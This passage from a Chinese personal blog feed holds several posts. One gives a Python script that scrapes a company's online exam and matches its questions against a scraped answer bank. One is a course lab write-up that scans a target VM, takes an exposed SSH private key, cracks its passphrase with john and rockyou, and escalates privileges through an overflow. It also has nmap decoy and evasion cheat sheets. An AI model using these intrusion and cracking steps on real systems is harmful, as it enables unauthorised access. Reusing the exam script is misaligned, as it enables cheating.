<p><strong>思路解析</strong>：在PE1的VRF A部署了RT的export和import都为10:1，PE2的VRF B部署了RT的export和import也都为为10:1，PE1和PE2便成为了MPBGP邻居，PE1发送的MPLS数据包，PE2就能够准确接收，PE2回复的MPLS数据包，PE1也能准确接收，同理VRF B也是如此。</p>
]]></content>
      <tags>
        <tag>信息网络</tag>
      </tags>
  </entry>
  <entry>
    <title>【python脚本爬取在线试题、并从本地题库搜答案】</title>
    <url>/1047/</url>
    <content><![CDATA[<p>返工了公司又开始整考试了，不能线下聚众就线上考。考也就算了，题库几千道，分低于85%还得通报批评重考写检讨，怕了怕了。</p>
<p>研究了一下，写个脚本爬在线试题，再从本地题库搜答案。本地题库是预处理过的。</p>
<p>主要工具是爬考试页面用了beautifulsoup，其他也就简单io操作，考虑过网络编程直接提交post，一个是试卷网址生成编号不太有规律，另一个是作答手工操作也不复杂，万一程序调试不好交了白卷彻底凉凉，好吧，主要还是菜。</p>
<span id="more"></span>

<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol>
<li>爬取在线练习题库。</li>
<li>本地预处理题库。</li>
<li>考试时爬取考试试题。</li>
<li>处理考试试题格式，从本地题库搜索答案。</li>
</ol>
<h1 id="爬取题库"><a href="#爬取题库" class="headerlink" title="爬取题库"></a>爬取题库</h1><p>考试是在企业微信平台，但是微信也能进，公众号的形式，进入考试&#x2F;练习的时候会跳转到web页面，说明这个考试系统本质还是个web。</p>
<p>转成浏览器先打开题库，想着先看看源码，再合计合计怎么从数据库爬，结果一看源码惊了，哪特么有数据库啊，所有的题目、选项、答案都在源码里一个id为<code>st_list</code>的div里：</p>
<p><img src="/1047/1.PNG"></p>
<p>每道题的结构又是这样的：</p>
<p><img src="/1047/2.PNG"></p>
<p>这直接把难度降到了最低，直接上beautifulsoup搞之：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html2txt</span>(<span class="params">file_in, file_out</span>):  <span class="comment">#file_in：题目html file_out：题目txt</span></span><br><span class="line"></span><br><span class="line">	f_in = <span class="built_in">open</span>(file_in, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	html = f_in.read()</span><br><span class="line"></span><br><span class="line">	bs = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">	s = bs.find(<span class="built_in">id</span>=<span class="string">&quot;st_list&quot;</span>).get_text().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	f_out = <span class="built_in">open</span> (file_out,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> s :</span><br><span class="line">		item = item.strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\r&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\r&#x27;</span>).strip(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#print(item)</span></span><br><span class="line">		<span class="keyword">if</span> item == <span class="string">&#x27;解析:&#x27;</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>, file = f_out)</span><br><span class="line">		<span class="keyword">elif</span> item != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">			<span class="built_in">print</span>(item, end = <span class="string">&#x27; &#x27;</span>, file = f_out)</span><br><span class="line"></span><br><span class="line">	f_in.close()</span><br><span class="line">	f_out.close()</span><br></pre></td></tr></table></figure>

<p>这里只有一个小坑，源题库太多字符问题，比如每道题目后面带着各种编码的换行，有<code>\n</code>的，有<code>\r</code>的，还有两种混合的，偶尔还来个前面夹杂空格的，服了。</p>
<p>想了半天，只能这样来一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = item.strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\r&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\r&#x27;</span>).strip(<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>strip</code>有前后顺序，前面四个可以保证<code>\n</code>、<code>\r</code>什么顺序都清掉，最后清空格。</p>
<p>这样把每道题的解析去掉，只留题目选项和答案，一道换一次行，出来是这样的：</p>
<p><img src="/1047/3.PNG"></p>
<h1 id="爬取试题"><a href="#爬取试题" class="headerlink" title="爬取试题"></a>爬取试题</h1><p>方法一样，我还想着考试源码要是连答案也有，都不用写脚本了，结果想得美，果然没答案，不过源码结构和题库是一样的，稍作修改即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">html2txt</span>(<span class="params">file_in, file_out</span>):  <span class="comment">#file_in：题目html file_out：题目txt</span></span><br><span class="line"></span><br><span class="line">	f_in = <span class="built_in">open</span>(file_in, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	html = f_in.read()</span><br><span class="line"></span><br><span class="line">	bs = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">	s = bs.find(<span class="built_in">id</span>=<span class="string">&quot;st_list&quot;</span>).get_text().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	f_out = <span class="built_in">open</span> (file_out,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> s :</span><br><span class="line">		item = item.strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\r&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\r&#x27;</span>).strip(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#print(item)</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> item != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">			<span class="built_in">print</span>(item, file = f_out)</span><br><span class="line"></span><br><span class="line">	f_in.close()</span><br><span class="line">	f_out.close()</span><br></pre></td></tr></table></figure>

<p>试题处理完是这样的：</p>
<p><img src="/1047/4.PNG"></p>
<h1 id="搜索答案"><a href="#搜索答案" class="headerlink" title="搜索答案"></a>搜索答案</h1><p>两个文件都处理好，接下来就是喜闻乐见的for循环查找了，简单操作一下完事：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">serch</span>(<span class="params">file_timu, file_tiku, file_ans</span>):  <span class="comment">#file_timu：题目txt file_tiku：题库txt file_ans：输出答案txt</span></span><br><span class="line"></span><br><span class="line">	f_timu = <span class="built_in">open</span>(file_timu, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	f_tiku = <span class="built_in">open</span>(file_tiku, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	f_out = <span class="built_in">open</span> (file_ans,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	s = f_timu.read()</span><br><span class="line"></span><br><span class="line">	s_tiku = f_tiku.read()</span><br><span class="line"></span><br><span class="line">	s = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	s_tiku = s_tiku.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> s :</span><br><span class="line"></span><br><span class="line">		<span class="comment">#item = item.strip(&#x27;\n&#x27;).strip(&#x27;\r&#x27;)</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> item != <span class="string">&#x27;&#x27;</span> :</span><br><span class="line">			</span><br><span class="line">			<span class="comment">#print(item)</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> item.find(<span class="string">&#x27;、&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">				item = item.split(<span class="string">&#x27;、&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">			<span class="comment">#print(item)</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> item == <span class="string">&#x27;[单选题] 0.50分&#x27;</span> <span class="keyword">or</span> item == <span class="string">&#x27;[多选题] 1.00分&#x27;</span> <span class="keyword">or</span> item == <span class="string">&#x27;[判断题] 0.50分&#x27;</span>:</span><br><span class="line">				<span class="keyword">for</span> it2 <span class="keyword">in</span> s_tiku :</span><br><span class="line">					<span class="keyword">if</span> it2.find(pre) != -<span class="number">1</span> :</span><br><span class="line">						<span class="comment">#print(&quot;【%d】 &quot; %i)</span></span><br><span class="line">						ans = it2.split(<span class="string">&#x27;答案:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">						<span class="keyword">if</span> ans == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">							ans = <span class="string">&#x27;正确&#x27;</span></span><br><span class="line">						<span class="keyword">elif</span> ans == <span class="string">&#x27;-1&#x27;</span> :</span><br><span class="line">							ans = <span class="string">&#x27;错误&#x27;</span></span><br><span class="line">						<span class="built_in">print</span>(<span class="string">&quot;【%d】%s &quot;</span> %(i, ans), it2, file = f_out)</span><br><span class="line">						i = i + <span class="number">1</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> (item.find(<span class="string">&#x27;[单选题] 0.50分&#x27;</span>) != -<span class="number">1</span>) <span class="keyword">or</span> (item.find(<span class="string">&#x27;[多选题] 1.00分&#x27;</span>) != -<span class="number">1</span>) <span class="keyword">or</span> (item.find(<span class="string">&#x27;[判断题] 0.50分&#x27;</span>) != -<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> it2 <span class="keyword">in</span> s_tiku :</span><br><span class="line">					<span class="keyword">if</span> it2.find(item[:-<span class="number">12</span>]) != -<span class="number">1</span> :</span><br><span class="line">						<span class="comment">#print(&quot;【%d】 &quot; %i)</span></span><br><span class="line">						ans = it2.split(<span class="string">&#x27;答案:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">						<span class="keyword">if</span> ans == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">							ans = <span class="string">&#x27;正确&#x27;</span></span><br><span class="line">						<span class="keyword">elif</span> ans == <span class="string">&#x27;-1&#x27;</span> :</span><br><span class="line">							ans = <span class="string">&#x27;错误&#x27;</span></span><br><span class="line">						<span class="built_in">print</span>(<span class="string">&quot;【%d】%s &quot;</span> %(i, ans), it2, file = f_out)</span><br><span class="line">						i = i + <span class="number">1</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">	</span><br><span class="line">		pre = item.split(<span class="string">&#x27;、&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	f_timu.close()</span><br><span class="line">	f_tiku.close()</span><br><span class="line">	f_out.close()</span><br></pre></td></tr></table></figure>

<p>脚本本身不难，关键是数据本身太多需要清洗的地方，脚本改了好几次。</p>
<p>搜索完是这样的：</p>
<p><img src="/1047/5.PNG"></p>
<p>保留了源题库内容的输出，方便再修bug。</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>【将部署在github上的hexo静态博客同时部署到coding上，同时提交百度收录】</title>
    <url>/1049/</url>
    <content><![CDATA[<p>使用hexo+github搭建好静态博客后发现，github在国内访问较慢，时不时还要被墙一下，而且GitHub封锁了百度爬虫，官方表示禁用百度爬虫这一举措可能会一直持续下去。这导致百度按<strong>site: url</strong>搜索是没有结果的，只有谷歌能收录到。</p>
<p>网上搜索了一下，得到一个解决方案：可以通过将博客搭建在国内的Coding上，然后通过域名分流解析，国内用户访问解析到Coding上，海外用户访问解析到GitHub。修改hexo的<code>_config.yml</code>文件，每次部署的时候自动往两个地方部署。</p>
<p><strong>另外一点，coding在2020年进行了较大改动，之前的挺多教程已经不太适用了，一边百度，一边摸索，总算是搭建成功，做个记录以便查看。</strong></p>
<span id="more"></span>

<h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><p>新建一个名为yourname的项目，<strong>其中这里的yourname最好是coding注册时的username，这样项目部署成功后博客的访问地址相对比较好记。</strong>如下所示coding可以创建私有仓库，GitHub中是要收费的。</p>
<p><strong>注：现在项目地址还是yourname.coding.net&#x2F;p &#x2F;yourname， 但是博客地址已经成了随机名称的coding-pages.com的二级域名了</strong></p>
<p><img src="/1049/1.PNG"></p>
<h1 id="添加-SSH-key"><a href="#添加-SSH-key" class="headerlink" title="添加 SSH key"></a>添加 SSH key</h1><p>打开个人设置，SSH公钥，点击新增公钥。</p>
<p><img src="/1049/3.PNG"></p>
<p>公钥位置在<strong>C:\Users\yourname.ssh\id_rsa.pub</strong></p>
<p>添加后可以在git bash里测试是否成功：</p>
<p><img src="/1049/5.PNG"></p>
<p>我已经添加过了，所以这样显示。第一次添加会有一个警告，yes回车就行。</p>
<p><strong>这里一定要注意，coding已经改了coding.net地址，新测试命令是<code>ssh -T git@e.coding.net</code></strong></p>
<p><img src="/1049/4.PNG"></p>
<h1 id="配置git"><a href="#配置git" class="headerlink" title="配置git"></a>配置git</h1><p>打开新建的项目概览，右侧可以看到项目的git地址：</p>
<p><img src="/1049/2.PNG"></p>
<p>复制这个地址，然后编辑本地博客目录下的<code>_config.yml</code>文件如下：</p>
<p><img src="/1049/6.PNG"></p>
<p>现在就可以实现<code>hexo d</code>命令自动在github和coding同时部署了。</p>
<h1 id="配置静态网站"><a href="#配置静态网站" class="headerlink" title="配置静态网站"></a>配置静态网站</h1><p>在项目中持续部署里有静态网站选项，coding上配置静态网站需要先实名认证，然后新建即可。</p>
<p><img src="/1049/7.PNG"></p>
<p><strong>注：新版在项目中直接找不到静态网站了，需要从项目设置-&gt;功能开关中打开持续部署功能：</strong></p>
<p><img src="/1049/8.PNG"></p>
<p>网站设置中可以把域名绑定，替换掉自带的随机coding-pages.com二级域名。<strong>记着去域名提供商控制台添加解析。</strong></p>
<p>也能开启强制HTTPS。</p>
<p><img src="/1049/9.PNG"></p>
<h1 id="提交百度收录"><a href="#提交百度收录" class="headerlink" title="提交百度收录"></a>提交百度收录</h1><p>上百度按照<strong>site: url</strong>搜索，没有结果：</p>
<p><img src="/1049/10.PNG"></p>
<p>点击<strong>提交网址</strong>，登录并提交网站，然后选择<strong>资源提交-&gt;链接提交</strong>：</p>
<p><img src="/1049/11.PNG"></p>
<p>选择<strong>自动提交-&gt;sitemap提交</strong>，输入地址<code>yoursite/sitemap.xml</code>、<code>yoursite/baidusitemap.xml</code>即可：</p>
<p><img src="/1049/12.PNG"></p>
<p>理论上是没问题的，sitemap也能打开，但是百度爬虫却爬取失败了，改天再研究研究。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://blog.csdn.net/tsvico/article/details/80629452">Hexo博客同时部署到GitHub和Coding</a></li>
<li><a href="https://blog.csdn.net/qq_33619378/article/details/81191564">基于hexo和coding免费搭建个人博客网站</a></li>
<li><a href="https://blog.csdn.net/slyzlh/article/details/105565975">解决coding配置ssh出现的Permission Denied (publickey)的问题</a></li>
</ol>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>git</tag>
        <tag>coding</tag>
      </tags>
  </entry>
  <entry>
    <title>【磁盘mbr转gpt后缺少esp分区导致win10无法引导的解决方案】</title>
    <url>/1050/</url>
    <content><![CDATA[<p>今天装deepin的时候发现办公室的新台式机磁盘竟然是mbr的，不是gpt+uefi，没办法，只能先把磁盘转成gpt。结果转完之后发现进不了win10了，进pe一看，缺少esp引导分区。搜了教程，新建分区，复制引导文件，修复成功。这里记个笔记，以便查阅。</p>
<span id="more"></span>

<h1 id="磁盘转换"><a href="#磁盘转换" class="headerlink" title="磁盘转换"></a>磁盘转换</h1><p>在pe或者win10（<strong>管理员身份</strong>）中运行DiskGenius，找到系统盘符，右键选择<code>转换分区类型为GUID格式</code>，转换完成后可以看到分区表类型变成<strong>gpt</strong>：</p>
<p><img src="/1050/1.PNG"></p>
<h1 id="新建esp分区"><a href="#新建esp分区" class="headerlink" title="新建esp分区"></a>新建esp分区</h1><p>进入PE，打开命令行界面，如果EFI分区还在的话，直接使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bcdboot C:\Windows</span><br></pre></td></tr></table></figure>

<p>其中‘C’是系统所在的盘符，在PE系统中系统盘符可能发生变化，请点开目录自行查看。</p>
<p><img src="/1050/2.PNG"></p>
<p>由图可见EFI分区已被删除或者根本就没有，则需要重新建立一个EFI分区。</p>
<p>使用PE中的diskgenius工具，在磁盘上分配一部分空余空间（我分配了300M）。</p>
<p>然后，使用如下命令建立EFI分区并建立引导。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskpart </span><br><span class="line">list disk </span><br><span class="line">select disk *                       // 选择你要重建EFI分区的盘的编号，以数字代替*</span><br><span class="line">list partition </span><br><span class="line">create partition efi size = 260     // 260M，分配给EFI分区的容量</span><br><span class="line">format quick fs = fat32 </span><br><span class="line"><span class="built_in">exit</span> </span><br><span class="line"> </span><br><span class="line">bcdboot C:\Windows                  // 注意盘符</span><br></pre></td></tr></table></figure>

<p><img src="/1050/3.PNG"></p>
<p>然后就可以通过windows boot manager引导进入win10。</p>
<p>另外efi分区应该默认是给了<code>z盘</code>的盘符。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://blog.csdn.net/Rookie_tong/article/details/84455527">Windows下误删EFI分区重建引导简单教程</a></li>
</ol>
]]></content>
      <tags>
        <tag>win10</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x01】SSH私钥泄露</title>
    <url>/1051/</url>
    <content><![CDATA[<p>51CTO的网课，本篇通过探测服务器敏感文件获取普通用户SSH秘钥，登录后代码审计，利用溢出提权，最终获取flag。</p>
<p>本篇使用工具netdiscover、nmap、dirb、ssh2john。</p>
<span id="more"></span>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>首先使用netdiscover扫描网段，找到靶机ip地址：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/1051/1.PNG"></p>
<ol start="2">
<li>使用nmap扫描靶机ip地址，找出开放端口：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1051/2.PNG"></p>
<p>可以看到31337端口开启了http服务，大于1024的端口一般是用户可自行支配的端口，属于敏感端口。</p>
<ol start="3">
<li>访问31337端口的http服务，查看页面和源码均没有什么有用的信息：</li>
</ol>
<p><img src="/1051/3.PNG"></p>
<ol start="4">
<li>使用dirb挖掘网站目录：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.113:31337/</span><br></pre></td></tr></table></figure>

<p><img src="/1051/4.PNG"></p>
<p>其中<code>robots.txt</code>提供给搜索引擎爬虫，告知网站中哪些资源不可爬取，一般这里会有敏感信息。</p>
<p>另外一个<code>/.ssh</code>也很有意思，有可能会有SSH秘钥。</p>
<ol start="5">
<li>访问<code>robots.txt</code>，看到一个不被允许访问的敏感目录<code>/taxes</code>，访问得到第一个flag：</li>
</ol>
<p><img src="/1051/5.PNG"></p>
<p><img src="/1051/6.PNG"></p>
<ol start="6">
<li>再回过头访问<code>/.ssh</code>目录，可以看到SSH秘钥对，将私钥和公钥都下载到本地：</li>
</ol>
<p><img src="/1051/7.PNG"></p>
<p><img src="/1051/8.PNG"></p>
<ol start="7">
<li>修改私钥<code>id_rsa</code>权限为600，即只允许root用户的读写操作，否则ssh登录会因为权限太多被拒绝：</li>
</ol>
<p><img src="/1051/9.PNG"></p>
<ol start="8">
<li>使用ssh2john对私钥进行破解：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; crack</span><br><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | john crack</span><br></pre></td></tr></table></figure>

<p><img src="/1051/10.PNG"></p>
<p>可以看到已破解出passphrase是starwars。</p>
<ol start="9">
<li>cat公钥得到用户名，配合私钥以及破解出来的密码，ssh登录靶机：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@gaoteng17:~/Desktop<span class="comment"># cat id_rsa.pub</span></span><br><span class="line">root@gaoteng17:~/Desktop<span class="comment"># ssh -i id_rsa simon@192.168.1.113</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:starwars</span><br></pre></td></tr></table></figure>

<p><img src="/1051/11.PNG"></p>
<ol start="10">
<li>切换到<code>/root</code>目录下，查看敏感文件，找到flag，但是权限不够：</li>
</ol>
<p><img src="/1051/12.PNG"></p>
<ol start="11">
<li>查看<code>/root</code>目录下的<code>read_message.c</code>文件，得到第2个flag：</li>
</ol>
<p><img src="/1051/13.PNG"></p>
<p>审计代码，发现有溢出漏洞。</p>
<ol start="12">
<li>查找有权限执行的文件，这步其实没怎么搞明白：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>&#x2F;是从根目录开始查找，最后的2&gt;&#x2F;dev&#x2F;null是将stderr信息转向到这个特殊null文件中，这样屏幕不会被权限不够这些错误信息刷屏从而找不到有用信息，0对应stdin，1对应stdout，但是中间的-perm -4000参数没怎么搞明白，网上也没搜到，以后再补充吧。</p>
<p><img src="/1051/14.PNG"></p>
<ol start="13">
<li>利用代码的溢出，输20位以Simon打头的字符，后面接上<code>/bin/sh</code>，实现提权，获得最后一个flag：</li>
</ol>
<p><img src="/1051/15.PNG"></p>
<p>这个也没怎么搞明白，为什么后面接<code>/bin/sh</code>就能提权，也没搜到，以后再补充吧。</p>
<h1 id="命令总结"><a href="#命令总结" class="headerlink" title="命令总结"></a>命令总结</h1><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><p>专用的二层发现工具。拥有主动和被动发现两种方式。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>-i:网卡</td>
<td>选择你监控的网卡。比如eth0</td>
</tr>
<tr>
<td>-r:range</td>
<td>指定IP段。比如192.168.0.0&#x2F;24</td>
</tr>
<tr>
<td>-l:filename</td>
<td>从文件读取range列表</td>
</tr>
<tr>
<td>-p</td>
<td>被动模式。默默的侦听指定的网卡以发现别的二层主机</td>
</tr>
<tr>
<td>-t</td>
<td>ARP包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。</td>
</tr>
<tr>
<td>-c</td>
<td>发包数量</td>
</tr>
</tbody></table>
<p>举例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -i eth0 -r 192.168.43.0/24   主动发现：-i指定所要侦听的网卡，-r指定ip段。</span><br><span class="line">netdiscover -p                            被动发现</span><br></pre></td></tr></table></figure>

<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>十条nmap常用的扫描命令:</p>
<ol>
<li>获取远程主机的系统类型及开放端口</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -P0 -sV -O &lt;target&gt;</span><br><span class="line">这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网</span><br></pre></td></tr></table></figure>

<ul>
<li>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)</li>
<li>-P0 允许你关闭 ICMP pings.</li>
<li>-sV 打开系统版本检测</li>
<li>-O 尝试识别远程操作系统</li>
</ul>
<p>其它选项:</p>
<ul>
<li>-A 同时打开操作系统指纹和版本检测</li>
<li>-v 详细输出扫描情况.</li>
</ul>
<ol start="2">
<li>列出开放了指定端口的主机列表</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT -p 80 -oG – 192.168.1.* | grep open</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>在网络寻找所有在线主机</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.*</span><br></pre></td></tr></table></figure>

<p>或者也可用以下命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24</span><br><span class="line">指定 subnet</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>Ping 指定范围内的 IP 地址</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.1.100-254</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>在某段子网上查找未占用的 IP</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -sP 192.168.2.0/24 &amp;&amp; egrep “00:00:00:00:00:00″ /proc/net/arp</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>在局域网上扫找 Conficker 蠕虫病毒</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PN -T4 -p139,445 -n -v –script=smb-check-vulns –script-args safe=1 192.168.0.1-254</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>扫描网络上的恶意接入点 （rogue APs）.</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p1-85,113,443,8080-8100 -T4 –min-hostgroup 50 –max-rtt-timeout</span><br><span class="line">2000 –initial-rtt-timeout 300 –max-retries 3 –host-timeout 20m</span><br><span class="line">–max-scan-delay 1000 -oA wapscan 10.0.0.0/8</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>使用诱饵扫描方法来扫描主机端口</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS 192.168.0.10 -D 192.168.0.2</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>为一个子网列出反向DNS记录</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -R -sL 209.85.229.99/27 | awk ‘&#123;<span class="keyword">if</span>(<span class="variable">$3</span>==”not”)<span class="built_in">print</span>”(“<span class="variable">$2</span>″) no PTR”;<span class="keyword">else</span> <span class="built_in">print</span><span class="variable">$3</span>″ is “<span class="variable">$2</span>&#125;’ | grep ‘(‘</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>显示网络上共有多少台 Linux 及 Win 设备?</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -F -O 192.168.0.1-255 | grep “Running: ” &gt; /tmp/os; <span class="built_in">echo</span> “$(<span class="built_in">cat</span> /tmp/os | grep Linux \</span><br><span class="line">| <span class="built_in">wc</span> -l) Linux device(s)”; <span class="built_in">echo</span> “$(<span class="built_in">cat</span> /tmp/os | grep Windows | <span class="built_in">wc</span> -l) Window(s) device”</span><br></pre></td></tr></table></figure>

<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><p>dirb是一个类似windows下御剑这些目录扫描工具，下面是几个常用的参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>设置ua</td>
</tr>
<tr>
<td>-c</td>
<td>设置cookie带cookie扫描</td>
</tr>
<tr>
<td>-N</td>
<td>忽略某些响应码</td>
</tr>
<tr>
<td>-o</td>
<td>输出结果</td>
</tr>
<tr>
<td>-p</td>
<td>使用代理</td>
</tr>
<tr>
<td>-X</td>
<td>在每个测试目录上附加后缀</td>
</tr>
<tr>
<td>-z</td>
<td>设置毫秒延迟</td>
</tr>
</tbody></table>
<p>举例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">一、正常扫描</span><br><span class="line">dirb 目标 字典路径</span><br><span class="line"></span><br><span class="line">二、设置 ua 和 cookie</span><br><span class="line">dirb 目标 字典路径 -a <span class="string">&quot;ua&quot;</span>  -c <span class="string">&quot;cookie&quot;</span></span><br><span class="line"></span><br><span class="line">三、使用代理和输出结果</span><br><span class="line">dirb 目标 字典路径 -p ip:port -o result.txt</span><br><span class="line"></span><br><span class="line">四、设置附加后缀</span><br><span class="line">dirb dirb 目标 字典路径 -X <span class="built_in">test</span>(这样每个被测试的字典都附加了<span class="built_in">test</span>)</span><br><span class="line"></span><br><span class="line">五、设置毫秒延迟</span><br><span class="line">如果目标存在一些安全程序爬扫描太快被屏蔽的话可以设置-z参数单位是毫秒</span><br><span class="line">dirb dirb 目标 字典路径 -z 1000 (1秒)</span><br><span class="line">现在只能1秒访问一次了</span><br></pre></td></tr></table></figure>

<h2 id="ssh2john"><a href="#ssh2john" class="headerlink" title="ssh2john"></a>ssh2john</h2><p>John the Ripper可以破解在RSA加密中创建的SSH私钥。</p>
<p>首先利用自带的ssh2john工具改变SSH私钥的格式变成john能处理的格式，然后跑字典进行破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br><span class="line">ssh2john id_rsa &gt; crack</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt crack</span><br><span class="line">john crack --show</span><br><span class="line"></span><br><span class="line">字典是gz包的话：</span><br><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | john crack</span><br></pre></td></tr></table></figure>

